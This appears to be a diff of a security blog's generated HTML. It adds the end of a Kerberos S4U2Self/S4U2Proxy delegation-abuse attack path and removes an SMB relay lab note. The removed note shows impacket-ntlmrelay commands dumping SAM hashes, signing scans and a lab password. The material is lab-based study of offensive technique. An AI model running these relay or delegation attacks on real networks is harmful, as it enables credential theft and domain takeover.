+<li>ServiceC (ServiceB&rsquo;s msDS-AllowedToDelegateTo target)</li>
+</ul>
+<p>Attack Path:</p>
+<ol>
+<li>Use DACL to write ServiceA on ServiceB&rsquo;s msDS-AllowedToActOnBehalfOfOtherIdentity</li>
+<li><code>S4U2Self</code> on ServiceA to get TGS for administrator to access ServiceA
+<ul>
+<li>result: non-forwardable TGS</li>
+<li>reason: non-forwardable due to the absence of <code>TrustedToAuthForDelegation</code> on ServiceA</li>
+</ul>
+</li>
+<li><code>S4U2Proxy</code> on ServiceA targetting ServiceB host SPN by embedding previously obtained non-forwardable TGS on <code>additional-tickets</code> field
+<ul>
+<li>result: forwardable TGS for administrator to access ServiceB</li>
+<li>reason: this works because ServiceA is not configured to be constrained delegation which does not requires the embedded TGS to be forwardable</li>
+</ul>
+</li>
+<li><code>S4U2Proxy</code> on ServiceB targetting ServiceC SPN (according to ServiceB&rsquo;s msDS-AllowedToDelegateTo value) by embedding previously obtained forwardable TGS on <code>additional-tickets</code> field
+<ul>
+<li>result: forwardable TGS for administrator to access ServiceC</li>
+<li>reason: <code>S4U2Proxy</code> on ServiceB works because the embedded TGS is forwardable, otherwise this fails</li>
+</ul>
+</li>
+</ol>
+<h3 class="relative group">TODO 
+    <div id="todo" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#todo" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Create ServiceA with constrained delegation w/o protocol transition to access ServiceB</li>
+<li>Create ServiceA to be RBCD to ServiceB</li>
+<li>Test full <code>S4U2</code> attack on ServiceA</li>
+</ul>
+<h3 class="relative group">References 
+    <div id="references" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><a href="https://en.hackndo.com/constrained-unconstrained-delegation/"   target="_blank">
+    https://en.hackndo.com/constrained-unconstrained-delegation/</a></li>
+<li><a href="https://beta.hackndo.com/unconstrained-delegation-attack/"   target="_blank">
+    https://beta.hackndo.com/unconstrained-delegation-attack/</a></li>
+<li><a href="https://beta.hackndo.com/resource-based-constrained-delegation-attack/"   target="_blank">
+    https://beta.hackndo.com/resource-based-constrained-delegation-attack/</a></li>
+<li><a href="https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break"   target="_blank">
+    https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break</a></li>
+<li><a href="https://blog.harmj0y.net/activedirectory/s4u2pwnage/"   target="_blank">
+    https://blog.harmj0y.net/activedirectory/s4u2pwnage/</a></li>
+<li><a href="https://blog.harmj0y.net/redteaming/another-word-on-delegation/"   target="_blank">
+    https://blog.harmj0y.net/redteaming/another-word-on-delegation/</a></li>
+<li><a href="https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/"   target="_blank">
+    https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/</a></li>
+<li><a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"   target="_blank">
+    https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a></li>
+<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"   target="_blank">
+    https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li>
+<li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/"   target="_blank">
+    https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/</a></li>
+<li><a href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"   target="_blank">
+    https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a></li>
+<li><a href="https://exploit.ph/delegate-2-thyself.html"   target="_blank">
+    https://exploit.ph/delegate-2-thyself.html</a></li>
+<li><a href="https://exploit.ph/revisiting-delegate-2-thyself.html"   target="_blank">
+    https://exploit.ph/revisiting-delegate-2-thyself.html</a></li>
+<li><a href="https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/"   target="_blank">
+    https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/</a></li>
+<li><a href="https://en.hackndo.com/service-principal-name-spn/#edge-case---host"   target="_blank">
+    https://en.hackndo.com/service-principal-name-spn/#edge-case---host</a></li>
+<li><a href="https://attl4s.github.io/assets/pdf/You_do_%28not%29_Understand_Kerberos_Delegation.pdf"   target="_blank">
+    https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf</a></li>
+<li><a href="https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/"   target="_blank">
+    https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations#talk"   target="_blank">
+    https://www.thehacker.recipes/ad/movement/kerberos/delegations#talk</a></li>
+<li><a href="https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/"   target="_blank">
+    https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/</a></li>
+</ul>
+
+        </div>
+                
+        
+
+        
+
+        
+
+
+<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+  
+  
+
+  <a href="/notes/active-directory/smb-relay-attack/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/notes/active-directory/smb-relay-attack/">SMB Relay Attack</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
 
 
 
@@ -767,553 +1505,11 @@
 
 
 
-    </div>
-
-    
-    
-    
-    
-    
-
-    
-
-    
-    
-    
-
-    
-
-    
-  
-  </header>
-  
-  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
-    
-     <div
-      class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
-      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
-
-         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
-  <summary
-    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-    Table of Contents
-  </summary>
-  <div
-    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#infrastructure">Infrastructure</a></li>
-    <li><a href="#prerequisite">Prerequisite</a>
-      <ul>
-        <li><a href="#smb-signing">SMB Signing</a></li>
-        <li><a href="#administrator-privilege">Administrator Privilege</a></li>
-      </ul>
-    </li>
-    <li><a href="#example">Example</a>
-      <ul>
-        <li><a href="#relaying-from-ws01-to-ws02-as-oscpalice-succeed">Relaying from <code>ws01</code> to <code>ws02</code> as <code>oscp\alice</code> (Succeed)</a>
-          <ul>
-            <li><a href="#attacker">Attacker</a></li>
-            <li><a href="#victim">Victim</a></li>
-          </ul>
-        </li>
-        <li><a href="#relaying-from-ws02-to-ws01-as-oscpbob-failed">Relaying from <code>ws02</code> to <code>ws01</code> as <code>oscp\bob</code> (Failed)</a>
-          <ul>
-            <li><a href="#attacker-1">Attacker</a></li>
-            <li><a href="#victim-1">Victim</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-  </div>
-</details>
-<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
-  <summary
-    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-    Table of Contents
-  </summary>
-  <div
-    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#infrastructure">Infrastructure</a></li>
-    <li><a href="#prerequisite">Prerequisite</a>
-      <ul>
-        <li><a href="#smb-signing">SMB Signing</a></li>
-        <li><a href="#administrator-privilege">Administrator Privilege</a></li>
-      </ul>
-    </li>
-    <li><a href="#example">Example</a>
-      <ul>
-        <li><a href="#relaying-from-ws01-to-ws02-as-oscpalice-succeed">Relaying from <code>ws01</code> to <code>ws02</code> as <code>oscp\alice</code> (Succeed)</a>
-          <ul>
-            <li><a href="#attacker">Attacker</a></li>
-            <li><a href="#victim">Victim</a></li>
-          </ul>
-        </li>
-        <li><a href="#relaying-from-ws02-to-ws01-as-oscpbob-failed">Relaying from <code>ws02</code> to <code>ws01</code> as <code>oscp\bob</code> (Failed)</a>
-          <ul>
-            <li><a href="#attacker-1">Attacker</a></li>
-            <li><a href="#victim-1">Victim</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-  </div>
-</details>
-
- 
-<script>
-  (function () {
-    var $toc = $('#TableOfContents');
-    if ($toc.length > 0) {
-      var $window = $(window);
-
-      function onScroll() {
-        var currentScroll = $window.scrollTop();
-        var h = $('.anchor');
-        var id = "";
-        h.each(function (i, e) {
-          e = $(e);
-          if (e.offset().top - $(window).height()/3 <= currentScroll) {
-            id = e.attr('id');
-          }
-        });
-        var active = $toc.find('a.active');      
-        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
-
-        active.each(function (i, e) {
-           
-            $(e).removeClass('active').siblings('ul').hide();
-          
-        });
-        $toc.find('a[href="#' + id + '"]').addClass('active')
-        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
-          $(e).children('a').parents('ul').show();          
-        });
-      }
-
-      $window.on('scroll', onScroll);
-      $(document).ready(function () {
-         
-          $toc.find('a').parent('li').find('ul').hide();
-        
-        onScroll();
-      });
-    }
-  })();
-</script>
-   </div>
-      </div>
-      
-
-      <div class="min-w-0 min-h-0 max-w-fit">
-        
-        
-
-
-        <div class="max-w-min mb-20">
-          <h2 class="relative group">Infrastructure 
-    <div id="infrastructure" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#infrastructure" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<ul>
-<li>dc01: 10.10.1.200</li>
-<li>ws01: 10.10.1.201</li>
-<li>ws02: 10.10.1.202</li>
-<li>attacker: 10.10.1.102</li>
-</ul>
-<h2 class="relative group">Prerequisite 
-    <div id="prerequisite" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#prerequisite" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<h3 class="relative group">SMB Signing 
-    <div id="smb-signing" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#smb-signing" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<ul>
-<li>
-<p>using <code>nmap</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nmap -vvv -p <span class="m">445</span> -Pn --script smb2-security-mode.nse -oA nmap/smb 10.10.1.200 10.10.1.201 10.10.1.202
-</span></span><span class="line"><span class="cl"><span class="gp">#</span> Nmap 7.93 scan initiated Fri Dec <span class="m">15</span> 16:11:55 <span class="m">2023</span> as: nmap -vvv -p <span class="m">445</span> -Pn --script smb2-security-mode.nse -oA nmap/smb 10.10.1.200 10.10.1.201 10.10.1.202
-</span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for dc01 (10.10.1.200)
-</span></span></span><span class="line"><span class="cl"><span class="go">Host is up, received user-set (0.0011s latency).
-</span></span></span><span class="line"><span class="cl"><span class="go">Scanned at 2023-12-15 16:11:59 +08 for 0s
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT    STATE SERVICE      REASON
-</span></span></span><span class="line"><span class="cl"><span class="go">445/tcp open  microsoft-ds syn-ack
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Host script results:
-</span></span></span><span class="line"><span class="cl"><span class="go">| smb2-security-mode:
-</span></span></span><span class="line"><span class="cl"><span class="go">|   311:
-</span></span></span><span class="line"><span class="cl"><span class="go">|_    Message signing enabled and required
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Nmap scan report for ws01 (10.10.1.201)
-</span></span></span><span class="line"><span class="cl"><span class="go">Host is up, received user-set (0.00090s latency).
-</span></span></span><span class="line"><span class="cl"><span class="go">Scanned at 2023-12-15 16:11:59 +08 for 0s
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT    STATE SERVICE      REASON
-</span></span></span><span class="line"><span class="cl"><span class="go">445/tcp open  microsoft-ds syn-ack
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Host script results:
-</span></span></span><span class="line"><span class="cl"><span class="go">| smb2-security-mode:
-</span></span></span><span class="line"><span class="cl"><span class="go">|   311:
-</span></span></span><span class="line"><span class="cl"><span class="go">|_    Message signing enabled but not required
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Nmap scan report for ws02 (10.10.1.202)
-</span></span></span><span class="line"><span class="cl"><span class="go">Host is up, received user-set (0.00096s latency).
-</span></span></span><span class="line"><span class="cl"><span class="go">Scanned at 2023-12-15 16:11:59 +08 for 0s
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT    STATE SERVICE      REASON
-</span></span></span><span class="line"><span class="cl"><span class="go">445/tcp open  microsoft-ds syn-ack
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Host script results:
-</span></span></span><span class="line"><span class="cl"><span class="go">| smb2-security-mode:
-</span></span></span><span class="line"><span class="cl"><span class="go">|   311:
-</span></span></span><span class="line"><span class="cl"><span class="go">|_    Message signing enabled but not required
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Read data files from: /usr/bin/../share/nmap
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> Nmap <span class="k">done</span> at Fri Dec <span class="m">15</span> 16:11:59 <span class="m">2023</span> -- <span class="m">3</span> IP addresses <span class="o">(</span><span class="m">3</span> hosts up<span class="o">)</span> scanned in 3.61 seconds
-</span></span></code></pre></div><ul>
-<li>Domain controller has <code>Message signing enabled and required</code></li>
-<li>Both workstations have <code>Message signing enabled but not required</code> (vulnerable to SMB relay attack)</li>
-</ul>
-</li>
-<li>
-<p>using <code>netexec</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> netexec smb 10.10.1.200 10.10.1.201 10.10.1.202 --gen-relay-list smb-signing-false.txt
-</span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.1.201     445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:oscp.lab) (signing:False) (SMBv1:False)
-</span></span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.1.202     445    WS02             [*] Windows 10.0 Build 17763 x64 (name:WS02) (domain:oscp.lab) (signing:False) (SMBv1:False)
-</span></span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.1.200     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:oscp.lab) (signing:True) (SMBv1:False)
-</span></span></span></code></pre></div><ul>
-<li>Domain controller has <code>signing:True</code></li>
-<li>Both workstations have <code>signing:False</code> (vulnerable to SMB relay attack)</li>
-</ul>
-</li>
-</ul>
-<h3 class="relative group">Administrator Privilege 
-    <div id="administrator-privilege" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#administrator-privilege" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>When relaying to target machine <code>X</code> from machine <code>Y</code> as a user <code>domain\john</code>,
-the user needs to have administrator privilege on the target machine <code>X</code> for
-this attack to work.</p>
-<p>In the setup environment, <code>oscp\alice</code> is in the <code>Administrators</code> group on
-both <code>ws01</code> and <code>ws02</code>. Thus, we could relay from anywhere (except for the
-target machine itself) to either <code>ws01</code> or <code>ws02</code> as <code>oscp\alice</code>. On the
-other hand, <code>oscp\bob</code> only has admin privilege on <code>ws02</code>. Hence, we could
-only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</code> as <code>oscp\bob</code>.</p>
-<h2 class="relative group">Example 
-    <div id="example" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#example" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<blockquote>
-<p>If impacket is installed on a virtual environment and needs to execute with <code>sudo</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo --preserve-env<span class="o">=</span>PATH env impacket-ntlmrelay ...
-</span></span></code></pre></div></blockquote>
-<h3 class="relative group">Relaying from <code>ws01</code> to <code>ws02</code> as <code>oscp\alice</code> (Succeed) 
-    <div id="relaying-from-ws01-to-ws02-as-oscpalice-succeed" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#relaying-from-ws01-to-ws02-as-oscpalice-succeed" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<h4 class="relative group">Attacker 
-    <div id="attacker" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#attacker" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-ntlmrelay -t 10.10.1.202 -smb2support
-</span></span><span class="line"><span class="cl"><span class="go">[...]
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Servers started, waiting for connections
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.1.201, attacking target smb://10.10.1.202
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating against smb://10.10.1.202 as OSCP/ALICE SUCCEED
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Service RemoteRegistry is in stopped state
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Service RemoteRegistry is disabled, enabling it
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Starting service RemoteRegistry
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Target system bootKey: 0x056273c5da163bf69d211acdca6423fc
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-</span></span></span><span class="line"><span class="cl"><span class="go">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-</span></span></span><span class="line"><span class="cl"><span class="go">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5f91be10619e258821be997884b135f7:::
-</span></span></span><span class="line"><span class="cl"><span class="go">bob:1002:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Done dumping SAM hashes for host: 10.10.1.202
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Stopping service RemoteRegistry
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Restoring the disabled state for service RemoteRegistry
-</span></span></span></code></pre></div><h4 class="relative group">Victim 
-    <div id="victim" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#victim" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\Users\Public&gt; hostname
-</span></span></span><span class="line"><span class="cl"><span class="go">ws01
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\Users\Public&gt; net use \\10.10.1.102 /user:oscp\alice Passw0rd!
-</span></span></span></code></pre></div><h3 class="relative group">Relaying from <code>ws02</code> to <code>ws01</code> as <code>oscp\bob</code> (Failed) 
-    <div id="relaying-from-ws02-to-ws01-as-oscpbob-failed" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#relaying-from-ws02-to-ws01-as-oscpbob-failed" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<h4 class="relative group">Attacker 
-    <div id="attacker-1" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#attacker-1" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-ntlmrelay -t 10.10.1.201 -smb2support
-</span></span><span class="line"><span class="cl"><span class="go">[...]
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Servers started, waiting for connections
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.1.202, attacking target smb://10.10.1.201
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticating against smb://10.10.1.201 as OSCP/BOB SUCCEED
-</span></span></span><span class="line"><span class="cl"><span class="go">[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
-</span></span></span></code></pre></div><h4 class="relative group">Victim 
-    <div id="victim-1" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#victim-1" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\Users\Public&gt; hostname
-</span></span></span><span class="line"><span class="cl"><span class="go">ws02
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\Users\Public&gt; net use \\10.10.1.102 /user:oscp\bob Passw0rd!
-</span></span></span></code></pre></div>
-        </div>
-                
-        
-
-        
-
-        
-
-
-<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
-<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
-  
-  
-
-  <a href="/posts/glacierctf-2023/pwn/glacier-rating/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/glacierctf-2023/pwn/glacier-rating/">Glacier Rating</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div style="cursor: default;" class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2023-11-28 00:00:00 &#43;0000 UTC">28 November 2023</time>
-  
-
-  
-  
-</div>
-
-
-
-
-
-<div style="cursor: pointer;" class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/glacierctf-2023/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    GlacierCTF 2023
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/pwn/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    pwn
-  </span>
-</span>
-
-  </span>
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/heap/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    heap
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/cpp/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    cpp
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/tcache-poisoning/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    tcache poisoning
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/double-free/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    double free
-  </span>
-</span>
-
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/fastbin-dup/&#34;,'_self');">
-    <span class="flex">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
-  >
-    fastbin dup
-  </span>
-</span>
-
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
         </div>
 
         
